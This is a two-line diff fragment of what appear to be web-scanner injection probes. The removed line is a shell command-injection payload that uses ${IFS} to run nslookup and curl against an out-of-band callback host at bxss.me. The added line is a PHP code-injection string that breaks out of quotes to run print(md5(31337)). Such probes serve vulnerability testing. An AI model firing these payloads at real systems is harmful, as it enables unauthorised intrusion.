@@ -1,1 +1,1 @@
-|(nslookup${IFS}-q${IFS}cname${IFS}hitabkntampbi3b971.bxss.me||curl${IFS}hitabkntampbi3b971.bxss.me)
+";print(md5(31337));$a="
